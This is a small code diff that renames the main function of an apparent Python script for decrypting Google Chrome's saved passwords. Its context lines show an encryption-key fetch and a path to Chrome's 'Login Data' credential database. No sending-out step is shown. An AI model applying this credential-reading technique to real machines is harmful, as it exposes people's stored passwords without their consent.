@@ -57,7 +57,7 @@ def password_decryption(password, encryption_key):
             return "No Passwords"
   
   
-def main():
+def ChromePasswords():
     key = fetching_encryption_key()
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
@@ -118,4 +118,4 @@ def main():
   
   
 if __name__ == "__main__":
-    main()
+    ChromePasswords()
